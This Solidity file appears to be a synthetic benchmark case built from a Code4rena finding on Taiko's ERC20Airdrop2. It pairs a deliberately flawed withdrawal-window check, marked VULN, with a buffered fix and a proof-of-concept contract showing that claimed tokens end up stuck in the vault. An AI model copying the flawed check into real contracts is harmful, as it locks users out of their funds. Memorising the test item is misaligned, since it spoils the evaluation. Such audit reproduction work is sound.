// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Taiko ERC20Airdrop2 — the withdrawal window closes as the airdrop fully
    unlocks (Code4rena 2024-03, H-03). SYNTHETIC, cheatcode-free.

    ongoingWithdrawals reverts once block.timestamp passes
    claimEnd + withdrawalWindow. That same instant is when getBalance reaches
    the full claim. run() does not warp: the block is already past the window.
    The control keeps the window open for a buffer after full unlock. */

contract MockTKO {
    string public name = "Taiko";
    string public symbol = "TKO";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "TKO: allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vault {
    function approve(address token, address spender, uint256 amount) external {
        MockTKO(token).approve(spender, amount);
    }
}

contract ERC20Airdrop2 {
    address public token;
    address public vault;
    uint64 public claimEnd;
    uint64 public withdrawalWindow;
    mapping(address => uint256) public claimedAmount;
    mapping(address => uint256) public withdrawnAmount;

    error WITHDRAWALS_NOT_ONGOING();
    event Withdrawn(address user, uint256 amount);

    constructor(address _token, address _vault, uint64 _claimEnd, uint64 _window) {
        token = _token;
        vault = _vault;
        claimEnd = _claimEnd;
        withdrawalWindow = _window;
    }

    modifier ongoingWithdrawals() {
        // @> VULN: equality is the full unlock, and the next timestamp is already too late
        if (claimEnd > block.timestamp || claimEnd + withdrawalWindow < block.timestamp) {
            revert WITHDRAWALS_NOT_ONGOING();
        }
        _;
    }

    function seedClaim(address user, uint256 amount) external {
        claimedAmount[user] = amount;
    }

    function windowClosed() public view returns (bool) {
        return claimEnd + withdrawalWindow < block.timestamp;
    }

    function withdraw(address user) external virtual ongoingWithdrawals {
        (, uint256 amount) = getBalance(user);
        withdrawnAmount[user] += amount;
        MockTKO(token).transferFrom(vault, user, amount);
        emit Withdrawn(user, amount);
    }

    function getBalance(address user) public view returns (uint256 balance, uint256 withdrawableAmount) {
        balance = claimedAmount[user];
        if (balance == 0) return (0, 0);
        if (block.timestamp < claimEnd) return (balance, 0);

        uint256 end = claimEnd + withdrawalWindow;
        uint256 capped = block.timestamp < end ? block.timestamp : end;
        uint256 timeBasedAllowance = balance * (capped - claimEnd) / withdrawalWindow;
        withdrawableAmount = timeBasedAllowance - withdrawnAmount[user];
    }
}

/// Buffer after full unlock, so a caller who misses the closing timestamp still receives the claim.
contract ERC20Airdrop2Fixed is ERC20Airdrop2 {
    uint64 public constant BUFFER = 10_000_000;

    constructor(address _token, address _vault, uint64 _claimEnd, uint64 _window)
        ERC20Airdrop2(_token, _vault, _claimEnd, _window)
    {}

    modifier ongoingWithBuffer() {
        if (claimEnd > block.timestamp || claimEnd + withdrawalWindow + BUFFER < block.timestamp) {
            revert WITHDRAWALS_NOT_ONGOING();
        }
        _;
    }

    function withdraw(address user) external override ongoingWithBuffer {
        (, uint256 amount) = getBalance(user);
        withdrawnAmount[user] += amount;
        MockTKO(token).transferFrom(vault, user, amount);
        emit Withdrawn(user, amount);
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 100 ether;
    uint64 public constant CLAIM_END = 1000;
    uint64 public constant WINDOW = 1000;

    MockTKO public tko; // nonce 1
    Vault public vault; // nonce 2
    ERC20Airdrop2 public airdrop; // nonce 3

    uint256 public stuck;
    uint256 public userReceived;
    bool public withdrawReverted;

    constructor() {
        tko = new MockTKO();
        vault = new Vault();
        airdrop = new ERC20Airdrop2(address(tko), address(vault), CLAIM_END, WINDOW);
    }

    function run() external {
        require(airdrop.windowClosed(), "window not past");
        tko.mint(address(vault), AMOUNT);
        vault.approve(address(tko), address(airdrop), AMOUNT);
        airdrop.seedClaim(address(this), AMOUNT);
        stuck = tko.balanceOf(address(vault));
        require(stuck == AMOUNT, "vault not funded");
        (bool ok, bytes memory ret) = address(airdrop).call(
            abi.encodeWithSelector(airdrop.withdraw.selector, address(this))
        );
        withdrawReverted = !ok;
        require(withdrawReverted, "withdraw must revert");
        require(_closed(ret), "unexpected revert");
        userReceived = tko.balanceOf(address(this));
        require(userReceived == 0, "user was paid");
        require(tko.balanceOf(address(vault)) == AMOUNT, "tokens left the vault");
    }

    function _closed(bytes memory ret) internal pure returns (bool) {
        if (ret.length < 4) return false;
        bytes4 sel;
        assembly {
            sel := mload(add(ret, 32))
        }
        return sel == ERC20Airdrop2.WITHDRAWALS_NOT_ONGOING.selector;
    }
}
